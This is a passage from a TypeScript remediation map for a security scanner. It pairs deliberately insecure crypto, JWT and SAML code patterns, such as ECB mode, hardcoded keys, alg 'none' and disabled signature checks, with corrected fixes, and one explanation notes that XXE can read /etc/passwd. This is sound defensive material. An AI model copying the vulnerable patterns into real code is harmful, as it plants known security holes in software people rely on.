// Remediation templates for the crypto / auth / data-platform / supply-chain
// finding IDs surfaced by src/gate/checks/**. Kept under src/gate/ so the gate
// self-scan (searchRepo ignores src/gate/**) does not self-trigger on the
// intentional "before" vulnerable examples embedded below.
//
// Every entry is a concrete, deterministic fix — real code / SQL / config —
// so these detections count toward the 90%-fixing mandate rather than
// advisory-only. Keys match the finding `id` verbatim.

import type { RemediationTemplate } from "../remediation-map.js";

export const DATA_REMEDIATIONS: Record<string, RemediationTemplate> = {
	// -------------------------------------------------------------------------
	// Cryptography — algorithm / mode / key / KDF / RNG
	// -------------------------------------------------------------------------
	"CRYPTO_AEAD_TAG_NOT_VERIFIED": {
		pattern: "const pt = Buffer.concat([decipher.update(ct), decipher.final()]) // GCM, setAuthTag never called",
		fix: "const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);\ndecipher.setAuthTag(tag); // MUST run before final()\nlet pt;\ntry { pt = Buffer.concat([decipher.update(ct), decipher.final()]); }\ncatch { throw new Error('authentication failed — reject ciphertext'); }",
		explanation: "An AEAD cipher (AES-GCM / ChaCha20-Poly1305) only protects integrity if the authentication tag is checked. Without setAuthTag() before final(), the tag is never verified and an attacker can tamper with ciphertext and have the app act on forged plaintext — defeating the whole point of AEAD. Set the tag and treat the error from final() as an authentication failure.",
		references: ["CWE-347", "CWE-354", "NIST SP 800-38D", "FIPS 140-3"]
	},
	"CRYPTO_AES_CBC_NO_AUTH": {
		pattern: "const c = crypto.createCipheriv('aes-256-cbc', key, iv) // unauthenticated, padding-oracle prone",
		fix: "const iv = crypto.randomBytes(12);\nconst c = crypto.createCipheriv('aes-256-gcm', key, iv);\nconst ct = Buffer.concat([c.update(pt), c.final()]);\nconst tag = c.getAuthTag(); // store iv + tag + ct together",
		explanation: "AES-CBC provides confidentiality but no integrity, so it is exploitable by padding-oracle attacks that decrypt data one byte at a time. Use AES-256-GCM (authenticated encryption) with a fresh random 12-byte nonce per message and store the GCM tag alongside the ciphertext. If CBC is unavoidable, apply encrypt-then-MAC with HMAC-SHA-256.",
		references: ["CWE-327", "CWE-353", "NIST SP 800-38D", "PCI DSS 4.0 Req 4.2"]
	},
	"CRYPTO_ECB_MODE": {
		pattern: "const c = crypto.createCipheriv('aes-256-ecb', key, null) // ECB leaks plaintext structure",
		fix: "const iv = crypto.randomBytes(12);\nconst c = crypto.createCipheriv('aes-256-gcm', key, iv);\nconst ct = Buffer.concat([c.update(pt), c.final()]);\nconst tag = c.getAuthTag();",
		explanation: "ECB mode encrypts each block independently, so identical plaintext blocks produce identical ciphertext blocks — patterns and structure leak (the classic 'ECB penguin'). Replace ECB with AES-256-GCM authenticated encryption using a unique random nonce per message.",
		references: ["CWE-327", "NIST SP 800-38A", "FIPS 140-3", "PCI DSS 4.0 Req 4.2"]
	},
	"CRYPTO_ECDSA_P256_PQC": {
		pattern: "crypto.generateKeyPairSync('ec', { namedCurve: 'prime256v1' }) // quantum-vulnerable long term",
		fix: "// Keep P-256 for short-lived signatures today; for long-lived keys adopt a\n// hybrid or post-quantum signature scheme:\nimport { ml_dsa65 } from '@noble/post-quantum/ml-dsa';\nconst { publicKey, secretKey } = ml_dsa65.keygen(crypto.randomBytes(32)); // FIPS 204 ML-DSA",
		explanation: "P-256 (secp256r1) is secure against classical computers but breakable by Shor's algorithm on a large quantum computer, so signatures that must stay valid for 10+ years are at 'harvest-now, verify-later' risk. Plan migration to NIST's post-quantum signature standard ML-DSA (FIPS 204) or SLH-DSA (FIPS 205), ideally as a hybrid ECDSA+ML-DSA scheme during transition.",
		references: ["CWE-327", "NIST FIPS 204", "NIST FIPS 205", "NIST SP 800-131A Rev 2"]
	},
	"CRYPTO_GCM_MODULE_LEVEL_NONCE": {
		pattern: "const NONCE = crypto.randomBytes(12); // module scope — reused on every call\nfunction encrypt(pt){ return crypto.createCipheriv('aes-256-gcm', key, NONCE); }",
		fix: "function encrypt(pt) {\n  const nonce = crypto.randomBytes(12); // fresh per call\n  const c = crypto.createCipheriv('aes-256-gcm', key, nonce);\n  const ct = Buffer.concat([c.update(pt), c.final()]);\n  return { nonce, ct, tag: c.getAuthTag() };\n}",
		explanation: "A nonce created once at module scope is initialized a single time and reused for every encryption. GCM nonce reuse under the same key is catastrophic: it leaks the XOR of plaintexts and exposes the authentication subkey, breaking both confidentiality and integrity. Generate a fresh 12-byte random nonce inside the encryption function on every call.",
		references: ["CWE-323", "CWE-329", "NIST SP 800-38D", "FIPS 140-3"]
	},
	"CRYPTO_GCM_NONCE_REUSE_RISK": {
		pattern: "const iv = Date.now().toString(); // time-based / mutable IV near AES-GCM",
		fix: "const nonce = crypto.randomBytes(12); // unique, unpredictable per message\nconst c = crypto.createCipheriv('aes-256-gcm', key, nonce);",
		explanation: "A time-based, counter-in-a-loop, or otherwise mutable IV risks producing the same (key, nonce) pair twice. GCM nonce reuse completely breaks the cipher — an attacker can recover plaintext XORs and forge tags. Always derive the nonce from crypto.randomBytes(12) per message, or use a strictly monotonic counter that can never repeat for a given key.",
		references: ["CWE-323", "NIST SP 800-38D", "FIPS 140-3", "PCI DSS 4.0 Req 4.2"]
	},
	"CRYPTO_GCM_NO_RANDOM_NONCE": {
		pattern: "const c = crypto.createCipheriv('aes-256-gcm', key, iv) // iv is fixed / not from a CSPRNG",
		fix: "const nonce = crypto.randomBytes(12);\nconst c = crypto.createCipheriv('aes-256-gcm', key, nonce);\n// prepend nonce to the ciphertext so the receiver can decrypt",
		explanation: "AES-GCM security depends on a unique nonce per encryption under a given key. A fixed, sequential, or time-based nonce eventually repeats and breaks confidentiality and authentication. Generate the 12-byte nonce with crypto.randomBytes for every encrypt call and transmit it alongside the ciphertext.",
		references: ["CWE-329", "CWE-330", "NIST SP 800-38D", "FIPS 140-3"]
	},
	"CRYPTO_HARDCODED_IV": {
		pattern: "const iv = Buffer.from('00112233445566778899aabb', 'hex') // constant IV literal",
		fix: "const iv = crypto.randomBytes(12); // AES-GCM: 12 bytes; AES-CBC: 16 bytes\nconst c = crypto.createCipheriv('aes-256-gcm', key, iv);\n// store the IV with the ciphertext; it need not be secret, only unique",
		explanation: "A hardcoded IV/nonce is reused on every encryption, so identical plaintexts always produce identical ciphertext, and for CTR/GCM/stream modes IV+key reuse leaks the keystream entirely. Generate a fresh random IV per message with crypto.randomBytes and store it (it does not need to be secret, only unique and unpredictable).",
		references: ["CWE-329", "CWE-330", "NIST SP 800-38D", "FIPS 140-3"]
	},
	"CRYPTO_HARDCODED_SYMMETRIC_KEY": {
		pattern: "const key = Buffer.from('4f3c...deadbeef', 'hex') // AES key literal in source",
		fix: "const key = Buffer.from(process.env.AES_KEY_HEX!, 'hex'); // from KMS / secrets manager\n// rotate the leaked key immediately and re-encrypt data protected by it",
		explanation: "A symmetric key embedded in source is recoverable from the repo, git history, and compiled bundles, so anyone with the code can decrypt everything protected by it. Load keys at runtime from a KMS or secrets manager (or an injected environment variable), and rotate any key that has ever appeared in source.",
		references: ["CWE-321", "CWE-798", "NIST SP 800-57 Part 1", "PCI DSS 4.0 Req 3.6"]
	},
	"CRYPTO_INSECURE_RANDOM_IDENTIFIER": {
		pattern: "const id = Math.random().toString(36).slice(2) // predictable identifier",
		fix: "const id = crypto.randomUUID(); // or crypto.randomBytes(16).toString('hex')",
		explanation: "Math.random() and other non-cryptographic PRNGs produce predictable output, so identifiers, reset paths, and invite codes built from them can be guessed or enumerated (IDOR). Use crypto.randomUUID() or crypto.randomBytes() for any identifier that must be unguessable.",
		references: ["CWE-338", "CWE-330", "OWASP ASVS 2.3.1", "NIST SP 800-90A"]
	},
	"CRYPTO_INSECURE_RNG_MATERIAL": {
		pattern: "const salt = Math.random().toString(16) // Math.random() for keying material",
		fix: "const salt = crypto.randomBytes(16);\nconst iv = crypto.randomBytes(12);\nconst token = crypto.randomBytes(32).toString('hex');",
		explanation: "Math.random() is a predictable PRNG whose internal state can be reconstructed from a handful of outputs, so any IV, nonce, salt, key, or token derived from it is recoverable by an attacker. Use crypto.randomBytes() (Node) or crypto.getRandomValues() (browser) for all keying material.",
		references: ["CWE-338", "CWE-330", "NIST SP 800-90A", "OWASP ASVS 6.3.1"]
	},
	"CRYPTO_LOW_PBKDF2_ITERATIONS": {
		pattern: "crypto.pbkdf2Sync(password, salt, 10000, 32, 'sha256') // far below OWASP minimum",
		fix: "// Prefer Argon2id for password hashing:\nimport argon2 from 'argon2';\nconst hash = await argon2.hash(password, { type: argon2.argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1 });\n// If PBKDF2 is mandated, use >= 600,000 iterations of SHA-256:\nconst dk = crypto.pbkdf2Sync(password, crypto.randomBytes(16), 600000, 32, 'sha256');",
		explanation: "Low PBKDF2 iteration counts let an attacker with the hash database test billions of candidate passwords per second on commodity GPUs. Use at least 600,000 iterations for PBKDF2-HMAC-SHA256 (OWASP 2023), or prefer a memory-hard KDF: Argon2id (memoryCost >= 19456 KiB, timeCost >= 2) or bcrypt cost >= 12.",
		references: ["CWE-916", "NIST SP 800-63B", "OWASP ASVS 2.4.1", "OWASP Password Storage Cheat Sheet"]
	},
	"CRYPTO_MISSING_CERT_PINNING": {
		pattern: "https.request({ host: 'api.example.com', path: '/v1' }) // trusts any CA-issued cert",
		fix: "const PINNED_FP = 'AB:CD:...'; // SPKI SHA-256 of the expected leaf/intermediate\nhttps.request({\n  host: 'api.example.com', path: '/v1',\n  checkServerIdentity: (host, cert) => {\n    const ok = tls.checkServerIdentity(host, cert);\n    if (ok) return ok;\n    if (cert.fingerprint256 !== PINNED_FP) return new Error('certificate pin mismatch');\n  }\n});",
		explanation: "Relying only on the CA trust store means any mis-issued or compromised CA certificate lets an attacker transparently MITM a high-value connection. Pin the server's certificate or public key (SPKI SHA-256) for critical API endpoints and fail closed on mismatch. Rotate pins ahead of certificate renewal to avoid outages.",
		references: ["CWE-295", "OWASP MASVS-NETWORK-1", "NIST SP 800-52 Rev 2"]
	},
	"CRYPTO_NO_FORWARD_SECRECY": {
		pattern: "const ciphers = 'AES256-GCM-SHA384' // static RSA key exchange, no ECDHE/DHE",
		fix: "const server = https.createServer({\n  key, cert,\n  minVersion: 'TLSv1.2',\n  honorCipherOrder: true,\n  ciphers: 'ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384'\n});\n// TLS 1.3 provides forward secrecy by default",
		explanation: "Cipher suites without ephemeral key exchange (ECDHE/DHE) derive session keys from the server's long-term private key, so a future key compromise retroactively decrypts every recorded session. Prefer ECDHE/DHE suites (or TLS 1.3, which mandates forward secrecy) and set honorCipherOrder so the server preference wins.",
		references: ["CWE-310", "NIST SP 800-52 Rev 2", "PCI DSS 4.0 Req 4.2.1", "FIPS 140-3"]
	},
	"CRYPTO_PBKDF2_HARDCODED_SALT": {
		pattern: "crypto.pbkdf2Sync(password, 'staticSaltValue', 600000, 32, 'sha256') // shared salt",
		fix: "const salt = crypto.randomBytes(16); // unique per user\nconst dk = crypto.pbkdf2Sync(password, salt, 600000, 32, 'sha256');\n// store `salt` (hex) alongside the derived hash in the DB",
		explanation: "A hardcoded or shared salt makes PBKDF2 behave like an unsalted hash: identical passwords produce identical hashes, and one precomputed rainbow table cracks every account at once. Generate a unique random salt per user with crypto.randomBytes(16) and store it next to the hash. Prefer Argon2id where possible.",
		references: ["CWE-759", "CWE-760", "NIST SP 800-63B", "OWASP Password Storage Cheat Sheet"]
	},
	"CRYPTO_RSA_1024": {
		pattern: "crypto.generateKeyPairSync('rsa', { modulusLength: 1024 }) // factorable",
		fix: "crypto.generateKeyPairSync('rsa', { modulusLength: 4096 });\n// or ECDSA P-384: crypto.generateKeyPairSync('ec', { namedCurve: 'secp384r1' });\n// reissue any TLS cert / signing key still on RSA-1024 immediately",
		explanation: "RSA-1024 provides well under 128 bits of security and is considered broken — NIST deprecated it in 2013. Generate new keys with RSA-4096 (or migrate to ECDSA P-384), and reissue any long-lived certificate or signing key still using 1024-bit RSA.",
		references: ["CWE-326", "NIST SP 800-131A Rev 2", "FIPS 140-3", "PCI DSS 4.0 Req 4.2"]
	},
	"CRYPTO_RSA_2048_PQC": {
		pattern: "crypto.generateKeyPairSync('rsa', { modulusLength: 2048 }) // quantum-vulnerable",
		fix: "// Classically secure today; for keys/data needing 10+ year secrecy adopt PQC:\nimport { ml_dsa65 } from '@noble/post-quantum/ml-dsa'; // FIPS 204 signatures\nimport { ml_kem768 } from '@noble/post-quantum/ml-kem';  // FIPS 203 key encapsulation\n// or run a hybrid RSA-4096 + ML-KEM scheme during transition",
		explanation: "RSA-2048 is secure against classical computers but will be broken by a sufficiently large quantum computer, exposing long-lived secrets to 'harvest-now, decrypt-later' attacks. For data that must stay confidential for a decade or more, migrate to NIST's post-quantum standards — ML-KEM (FIPS 203) for key establishment and ML-DSA (FIPS 204) for signatures — ideally as a hybrid classical+PQC scheme.",
		references: ["CWE-327", "NIST FIPS 203", "NIST FIPS 204", "NIST SP 800-131A Rev 2"]
	},
	"CRYPTO_RSA_PKCS1_PADDING": {
		pattern: "crypto.publicEncrypt(publicKey, data) // defaults to PKCS#1 v1.5 padding",
		fix: "crypto.publicEncrypt({ key: publicKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' }, data);\n// for signatures use RSA-PSS: { padding: crypto.constants.RSA_PKCS1_PSS_PADDING }",
		explanation: "RSA PKCS#1 v1.5 encryption padding is vulnerable to Bleichenbacher adaptive chosen-ciphertext (padding-oracle) attacks that recover plaintext or forge signatures. Use RSA-OAEP (with SHA-256) for encryption and RSA-PSS for signatures instead of the legacy v1.5 padding.",
		references: ["CWE-327", "CWE-780", "NIST SP 800-56B Rev 2", "FIPS 140-3"]
	},
	"CRYPTO_RSA_WEAK_KEY": {
		pattern: "crypto.generateKeyPairSync('rsa', { modulusLength: 1536 }) // sub-2048 modulus",
		fix: "crypto.generateKeyPairSync('rsa', { modulusLength: 4096 }); // 2048 minimum, 4096 for long-lived keys",
		explanation: "RSA keys below 2048 bits (512/768/1536) are factorable with commodity hardware and are prohibited by NIST SP 800-131A Rev 2. Use a minimum modulusLength of 2048 and prefer 4096 for keys that must live for years; consider ECDSA P-256/P-384 for smaller, faster keys.",
		references: ["CWE-326", "NIST SP 800-131A Rev 2", "FIPS 140-3", "PCI DSS 4.0 Req 4.2"]
	},
	"CRYPTO_SHA_USED_FOR_PASSWORD": {
		pattern: "const hash = crypto.createHash('sha256').update(password).digest('hex') // fast hash for password",
		fix: "import argon2 from 'argon2';\nconst hash = await argon2.hash(password, { type: argon2.argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1 });\nconst ok = await argon2.verify(hash, candidate); // constant-time by design",
		explanation: "SHA-256/SHA-512 are fast general-purpose hashes; a GPU can test billions of guesses per second against them, so they are unsuitable for password storage even with a salt. Use a purpose-built, memory-hard password KDF: Argon2id (preferred), scrypt, or bcrypt (cost >= 12).",
		references: ["CWE-916", "CWE-327", "NIST SP 800-63B", "OWASP Password Storage Cheat Sheet"]
	},
	"CRYPTO_SIGNATURE_SHA1": {
		pattern: "crypto.createSign('sha1').update(data).sign(privateKey) // SHA-1 signature",
		fix: "crypto.createSign('sha256').update(data).sign(privateKey);\n// verify: crypto.createVerify('sha256').update(data).verify(publicKey, sig)",
		explanation: "SHA-1 is broken for collision resistance (the SHAttered attack produced real colliding inputs), so signatures computed over SHA-1 can be forged by crafting a colliding message. Sign and verify with SHA-256 or stronger for all RSA/ECDSA digital signatures.",
		references: ["CWE-327", "CWE-328", "NIST SP 800-131A Rev 2", "FIPS 140-3"]
	},
	"CRYPTO_STATIC_IV_REUSED": {
		pattern: "const IV = crypto.randomBytes(12); // module scope, reused for every encrypt()",
		fix: "function encrypt(pt) {\n  const iv = crypto.randomBytes(12); // fresh per message\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([c.update(pt), c.final()]);\n  return Buffer.concat([iv, c.getAuthTag(), ct]); // prepend iv + tag\n}",
		explanation: "An IV/nonce defined once at module scope is reused across every encryption, so identical plaintexts encrypt to identical ciphertexts, and for CTR/GCM/stream modes IV+key reuse leaks the keystream entirely. Generate a fresh IV per message inside the encryption function and prepend it to the output.",
		references: ["CWE-323", "CWE-329", "NIST SP 800-38D", "FIPS 140-3"]
	},
	"CRYPTO_STREAM_NONCE_REUSE": {
		pattern: "const c = crypto.createCipheriv('chacha20-poly1305', key, STATIC_NONCE, { authTagLength: 16 })",
		fix: "const nonce = crypto.randomBytes(12); // unique per message, never reused with this key\nconst c = crypto.createCipheriv('chacha20-poly1305', key, nonce, { authTagLength: 16 });",
		explanation: "Reusing a nonce with the same key on a stream cipher (ChaCha20/CTR) produces the same keystream, so XORing two ciphertexts recovers both plaintexts, and for Poly1305 it enables tag forgery. Use a unique random nonce per message and never reuse a (key, nonce) pair.",
		references: ["CWE-323", "NIST SP 800-38D", "RFC 8439", "FIPS 140-3"]
	},
	"CRYPTO_TOKEN_NO_TTL": {
		pattern: "f.decrypt(token) # Fernet decrypt with no ttl — token valid forever",
		fix: "# python (Fernet): raises on expiry\nplaintext = f.decrypt(token, ttl=3600)\n// node: verify an explicit expiry claim\nif (!payload.exp || payload.exp * 1000 < Date.now()) throw new Error('token expired');",
		explanation: "A token issued or verified without a TTL/expiry stays valid indefinitely, so a single leaked token grants permanent access even after rotation or logout. Enforce a TTL when decrypting/verifying tokens (Fernet ttl argument) and embed and check an expiry claim on every use.",
		references: ["CWE-613", "OWASP ASVS 3.3.1", "NIST SP 800-63B"]
	},
	"CRYPTO_TRUNCATED_HMAC": {
		pattern: "const tag = crypto.createHmac('sha256', key).update(msg).digest().subarray(0, 8) // 64-bit tag",
		fix: "const tag = crypto.createHmac('sha256', key).update(msg).digest(); // full 32-byte tag\nconst ok = crypto.timingSafeEqual(tag, received); // constant-time compare",
		explanation: "Truncating an HMAC below 128 bits (16 bytes) lowers the effort to forge a valid tag and weakens the authentication guarantee. Keep at least 128 bits of the HMAC output — use the full digest unless a standard explicitly specifies a shorter tag — and compare with a timing-safe function.",
		references: ["CWE-328", "NIST SP 800-107 Rev 1", "FIPS 198-1"]
	},
	"CRYPTO_WEAK_DH_PARAMS": {
		pattern: "crypto.getDiffieHellman('modp2') // 1024-bit MODP group, Logjam-vulnerable",
		fix: "crypto.getDiffieHellman('modp14'); // 2048-bit group minimum\n// prefer ECDH: crypto.generateKeyPairSync('ec', { namedCurve: 'secp384r1' })",
		explanation: "DH parameters below 2048 bits or the well-known weak MODP groups (modp1/2/5) are broken by Logjam-style precomputation, where an attacker precomputes against the shared group and then breaks many sessions cheaply. Use modp14 (2048-bit) or higher, or prefer ECDH with P-256/P-384.",
		references: ["CWE-326", "NIST SP 800-56A Rev 3", "FIPS 140-3", "PCI DSS 4.0 Req 4.2"]
	},
	"CRYPTO_WEAK_ECDSA_CURVE": {
		pattern: "crypto.generateKeyPairSync('ec', { namedCurve: 'secp192r1' }) // ~96-bit security",
		fix: "crypto.generateKeyPairSync('ec', { namedCurve: 'prime256v1' }); // P-256, 128-bit; P-384 for higher assurance",
		explanation: "A 192-bit elliptic curve provides only about 96 bits of security, below the 128-bit minimum required by NIST SP 800-131A Rev 2. Use P-256 (prime256v1) at minimum, or P-384 for higher assurance, and retire P-192 and smaller curves.",
		references: ["CWE-326", "NIST SP 800-131A Rev 2", "FIPS 186-5", "FIPS 140-3"]
	},
	"CRYPTO_WEAK_KDF_PARAMETERS": {
		pattern: "argon2.hash(pw, { memoryCost: 4096, timeCost: 1 }) // work factors below OWASP minimums",
		fix: "await argon2.hash(pw, { type: argon2.argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1 });\n// scrypt: N >= 2^17 (131072); bcrypt: cost >= 12",
		explanation: "Low KDF work factors let an attacker with the hash database test billions of candidate passwords per second on commodity GPUs. Raise parameters to OWASP 2023 minimums: Argon2id memoryCost >= 19456 KiB and timeCost >= 2, scrypt N >= 2^17, or bcrypt cost >= 12 (prefer 12+).",
		references: ["CWE-916", "NIST SP 800-63B", "OWASP ASVS 2.4.1", "OWASP Password Storage Cheat Sheet"]
	},
	"CRYPTO_ZERO_IV": {
		pattern: "const iv = Buffer.alloc(16) // all-zero IV",
		fix: "const iv = crypto.randomBytes(12); // AES-GCM nonce (16 for AES-CBC)\nconst c = crypto.createCipheriv('aes-256-gcm', key, iv);",
		explanation: "Buffer.alloc(n) yields an all-zeros IV, which is equivalent to a hardcoded IV: every encryption under the same key produces identical ciphertext for identical plaintext, and for CTR/GCM it fatally reuses the keystream. Generate the IV/nonce with crypto.randomBytes and store it with the ciphertext.",
		references: ["CWE-329", "CWE-330", "NIST SP 800-38D", "FIPS 140-3"]
	},

	// -------------------------------------------------------------------------
	// JWT
	// -------------------------------------------------------------------------
	"JWT_ALG_CONFUSION_EXPLICIT": {
		pattern: "jwt.verify(token, rsaPublicKeyPem, { algorithms: ['HS256'] }) // public key used as HMAC secret",
		fix: "jwt.verify(token, rsaPublicKeyPem, { algorithms: ['RS256'] }); // asymmetric verify, alg pinned",
		explanation: "Verifying with HS256 while passing an RSA public key means the public key is used as the HMAC secret — the classic algorithm-confusion exploit: an attacker signs a forged token with HS256 using the well-known public key and the server accepts it. Pin the algorithm to the asymmetric scheme (RS256/ES256) that matches your key type.",
		references: ["CWE-327", "CWE-347", "RFC 8725", "OWASP JWT Security Cheat Sheet"]
	},
	"JWT_ALG_CONFUSION_RISK": {
		pattern: "jwt.verify(token, process.env.PUBLIC_KEY, {}) // no algorithms array; env may hold a public key",
		fix: "jwt.verify(token, process.env.PUBLIC_KEY!, { algorithms: ['RS256'] }); // pin the asymmetric algorithm",
		explanation: "Verifying against an env-var key without pinning the algorithm invites algorithm confusion: if that variable holds an RSA public key, an attacker can forge an HS256-signed token using it as the HMAC secret. Always pass an explicit algorithms array locking the verifier to the intended asymmetric algorithm.",
		references: ["CWE-327", "CWE-347", "RFC 8725", "OWASP JWT Security Cheat Sheet"]
	},
	"JWT_ALG_LIST_INCLUDES_NONE": {
		pattern: "jwt.verify(token, key, { algorithms: ['HS256', 'none'] }) // 'none' allowlisted",
		fix: "jwt.verify(token, key, { algorithms: ['HS256'] }); // real algorithm(s) only, never 'none'",
		explanation: "Listing 'none' alongside a real algorithm lets an attacker set the token header alg to 'none', strip the signature, and still be accepted because 'none' is allowlisted. Remove 'none' entirely — the algorithms array must contain only the algorithm(s) you actually issue.",
		references: ["CWE-327", "CWE-347", "RFC 8725", "OWASP JWT Security Cheat Sheet"]
	},
	"JWT_ALG_NONE_EXPLICIT": {
		pattern: "jwt.verify(token, key, { algorithms: ['none'] }) // unsigned tokens accepted",
		fix: "jwt.verify(token, publicKey, { algorithms: ['RS256'] }); // reject unsigned tokens",
		explanation: "Allowing the 'none' algorithm means the verifier accepts tokens with no signature at all, so an attacker forges any claims (including admin/roles) trivially. Remove 'none' and pin a single expected asymmetric algorithm.",
		references: ["CWE-327", "CWE-347", "RFC 8725", "OWASP JWT Security Cheat Sheet"]
	},
	"JWT_ALG_NOT_LOCKED": {
		pattern: "jwt.verify(token, key) // no algorithms array — verifier trusts the token's own alg header",
		fix: "jwt.verify(token, publicKey, { algorithms: ['RS256'] }); // lock to one asymmetric algorithm",
		explanation: "Without an explicit algorithms array, the verifier honors the algorithm named in the attacker-controlled token header, opening algorithm-confusion (HS/RS) and 'none' attacks. Always pin the verifier to the exact algorithm(s) you issue.",
		references: ["CWE-327", "CWE-347", "RFC 8725", "OWASP ASVS 3.5.3"]
	},
	"JWT_HS_RS_CONFUSION": {
		pattern: "jwt.verify(token, publicKey) // public key + no alg pin -> HS/RS confusion",
		fix: "jwt.verify(token, publicKey, { algorithms: ['RS256'] }); // or ['ES256'] to match your key type",
		explanation: "When a verifier holds an asymmetric public key but does not pin the algorithm, an attacker submits a token signed with HS256 using that public key as the HMAC secret and it validates (CVE-2015-9235 class). Explicitly pin RS256/ES256 so an HMAC-signed token is rejected.",
		references: ["CWE-327", "CWE-347", "RFC 8725", "OWASP JWT Security Cheat Sheet"]
	},
	"JWT_JWKS_URI_OVERRIDE": {
		pattern: "const client = new JwksClient({ jwksUri: token.payload.iss + '/.well-known/jwks.json' })",
		fix: "const ALLOWED = new Set(['https://auth.example.com/.well-known/jwks.json']);\nconst jwksUri = process.env.JWKS_URI!; // fixed at deploy time\nif (!ALLOWED.has(jwksUri)) throw new Error('untrusted JWKS URI');\nconst client = new JwksClient({ jwksUri });",
		explanation: "Deriving the JWKS endpoint dynamically from the token or request lets an attacker point key resolution at a server they control and sign arbitrary tokens (jku/x5u abuse and SSRF). Pin the JWKS URI to a hardcoded or environment-controlled allowlist; never take it from user input.",
		references: ["CWE-295", "CWE-347", "CWE-918", "RFC 7515"]
	},
	"JWT_KID_KEY_LOAD_NO_ALLOWLIST": {
		pattern: "const key = fs.readFileSync(`/keys/${header.kid}`) // kid used as a path/DB/URL lookup",
		fix: "const ALLOWED_KEYS = { 'key-2024': PUB_2024, 'key-2025': PUB_2025 };\nconst key = ALLOWED_KEYS[decoded.header.kid];\nif (!key) throw new Error('unknown kid');",
		explanation: "Using the attacker-controlled kid header to load a key from disk, a database, or a URL enables key injection and path traversal — the attacker supplies a kid that resolves to a key they control and forges valid signatures. Resolve kid only through a fixed server-side allowlist mapping kid -> known public key.",
		references: ["CWE-290", "CWE-347", "RFC 8725", "OWASP JWT Security Cheat Sheet"]
	},
	"JWT_MISSING_EXPIRY": {
		pattern: "jwt.sign(payload, secret) // no expiresIn — token never expires",
		fix: "jwt.sign(payload, privateKey, { algorithm: 'RS256', expiresIn: '1h' }); // and verify exp on use",
		explanation: "A JWT signed without expiresIn remains valid indefinitely, so a leaked or stolen token grants access forever, even after account compromise or logout. Always set a short expiry (e.g. 1h for access tokens) and validate the exp claim on every request; use refresh tokens for longer sessions.",
		references: ["CWE-613", "OWASP ASVS 3.3.1", "RFC 7519", "NIST SP 800-63B"]
	},

	// -------------------------------------------------------------------------
	// SAML
	// -------------------------------------------------------------------------
	"SAML_ASSERTION_XXE": {
		pattern: "const doc = new DOMParser().parseFromString(samlResponse, 'text/xml') // DTD/entities enabled",
		fix: "import { parseXml } from 'libxmljs2';\nconst doc = parseXml(samlResponse, { noent: false, nonet: true, dtdload: false, dtdvalid: false });\n// or use a SAML library configured to reject DOCTYPE declarations outright",
		explanation: "Parsing a SAMLResponse without disabling DTDs and external entities allows XML External Entity injection: a crafted assertion can read local files (file:///etc/passwd) or perform SSRF during signature processing. Parse SAML XML with external entities, network access, and DOCTYPE loading disabled.",
		references: ["CWE-611", "OWASP XXE Prevention Cheat Sheet", "NIST SP 800-53 SI-10"]
	},
	"SAML_MISSING_INRESPONSETO": {
		pattern: "new SamlStrategy({ cert: IDP_CERT }) // validateInResponseTo not set",
		fix: "new SamlStrategy({ cert: IDP_CERT, validateInResponseTo: 'always', requestIdExpirationPeriodMs: 8 * 3600 * 1000 }, verify);",
		explanation: "Without InResponseTo validation, the SP accepts SAML responses that were not tied to a request it issued, letting an attacker inject a captured response from a different session. Enable validateInResponseTo so each response is matched to a pending, unexpired request ID.",
		references: ["CWE-347", "OASIS SAML 2.0 Core", "NIST SP 800-63C"]
	},
	"SAML_REPLAY_NOT_PREVENTED": {
		pattern: "// SAML assertion consumed with no assertion-ID cache — same assertion accepted twice",
		fix: "if (await assertionCache.has(assertionId)) throw new Error('replayed assertion');\nawait assertionCache.set(assertionId, true, ttlUntil(notOnOrAfter)); // TTL = assertion validity window",
		explanation: "Without replay prevention, a captured SAML assertion can be presented again to authenticate as the victim until it expires. Cache each consumed assertion ID with a TTL matching its NotOnOrAfter window and reject any duplicate ID.",
		references: ["CWE-294", "OASIS SAML 2.0 Core", "NIST SP 800-63C"]
	},
	"SAML_RESPONSE_UNSIGNED": {
		pattern: "new SamlStrategy({ wantAssertionsSigned: false, wantAuthnResponseSigned: false })",
		fix: "new SamlStrategy({ cert: IDP_CERT, wantAuthnResponseSigned: true, wantAssertionsSigned: true }, verify);",
		explanation: "Setting wantAuthnResponseSigned or wantAssertionsSigned to false lets the SP accept unsigned SAML responses/assertions, so an attacker forges arbitrary assertions claiming to be any user. Require both the response and the assertions to be signed and verify against the IdP certificate.",
		references: ["CWE-347", "OASIS SAML 2.0 Core", "NIST SP 800-63C"]
	},
	"SAML_SIGNATURE_NOT_ENFORCED": {
		pattern: "new SamlStrategy({ validateSignature: false }) // signature validation disabled",
		fix: "new SamlStrategy({ cert: IDP_CERT, validateSignature: true, wantAssertionsSigned: true }, verify);",
		explanation: "Disabling SAML signature validation means any user can craft an assertion claiming to be any other user and the SP will trust it — a complete authentication bypass. Enable validateSignature and wantAssertionsSigned, and pin the IdP's signing certificate.",
		references: ["CWE-347", "OASIS SAML 2.0 Core", "NIST SP 800-63C"]
	},
	"SAML_UNSOLICITED_RESPONSE_ALLOWED": {
		pattern: "new SamlStrategy({ allowUnsolicitedResponses: true }) // IdP-initiated SSO accepted",
		fix: "new SamlStrategy({ cert: IDP_CERT, allowUnsolicitedResponses: false, validateInResponseTo: 'always' }, verify);",
		explanation: "Allowing unsolicited (IdP-initiated) responses bypasses InResponseTo checks, enabling XML Signature Wrapping and session-injection attacks where an attacker forces a SAML response into the victim's session. Disable unsolicited responses and require InResponseTo validation.",
		references: ["CWE-347", "OASIS SAML 2.0 Core", "NIST SP 800-63C"]
	},
	"SAML_XSW_RISK": {
		pattern: "new SamlStrategy({ cert: IDP_CERT }) // partial protections — XSW surface open",
		fix: "new SamlStrategy({ cert: IDP_CERT, validateInResponseTo: 'always', wantAuthnResponseSigned: true, wantAssertionsSigned: true }, verify);",
